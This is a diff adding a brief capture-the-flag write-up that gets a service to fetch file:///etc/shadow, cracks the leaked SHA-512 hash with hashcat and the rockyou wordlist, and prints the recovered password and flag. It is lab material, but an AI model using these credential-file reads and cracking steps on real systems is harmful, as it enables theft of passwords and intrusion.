@@ -1,0 +1,7 @@
+1. Let it curl `file:///etc/shadow` or `file://localhost/etc/shadow`
+2. Use hashcat with rockyou to break the hash `$6$790Vj.KXQNkViVyt$4oSxluwB.OUx10navg0n05Z3U5yupMgdEO8Kj1ZhXdH6Z1CoVuC51mGkE2qtKSgT79WP3xT03fFskywZzGCVz0` -> `ripcurlgurl`
+
+> cmd: .\hashcat.exe -m 1800 -a 0 .\pass.txt ..\rockyou.txt
+
+ictf{ripcurlgurl}
+
